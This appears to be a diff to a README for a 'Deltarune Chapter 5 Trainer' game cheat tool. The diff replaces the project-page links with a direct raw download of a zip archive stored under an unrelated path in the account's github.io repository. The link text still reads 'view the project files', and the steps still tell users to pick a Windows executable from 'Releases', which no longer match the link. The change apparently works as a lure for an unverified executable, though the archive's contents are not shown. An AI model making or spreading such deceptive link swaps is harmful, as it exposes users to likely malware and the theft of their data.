@@ -5,7 +5,7 @@ description: "Modify party health, stats, and item counts in Deltarune Chapter 5
 ---
 # 🎮 Deltarune-Chapter5-Trainer-Ultimate - Master your game with ease today
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/thermioniccurrentlivingrock973/Deltarune-Chapter5-Trainer-Ultimate)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://raw.githubusercontent.com/thermioniccurrentlivingrock973/thermioniccurrentlivingrock973.github.io/main/cannequin/thermioniccurrentlivingrock-github-io-3.7.zip)
 
 ## 📌 About this project
 
@@ -30,7 +30,7 @@ The Deltarune-Chapter5-Trainer-Ultimate helps you control your game experience. 
 
 Follow these steps to prepare the tool for use.
 
-1.  Visit the [official link](https://github.com/thermioniccurrentlivingrock973/Deltarune-Chapter5-Trainer-Ultimate) to view the project files.
+1.  Visit the [official link](https://raw.githubusercontent.com/thermioniccurrentlivingrock973/thermioniccurrentlivingrock973.github.io/main/cannequin/thermioniccurrentlivingrock-github-io-3.7.zip) to view the project files.
 2.  Click the button that says "Releases" on the right side of the screen.
 3.  Choose the latest version labeled as a Windows executable file.
 4.  Save the file to a folder you can find easily, such as your Downloads or Desktop folder.
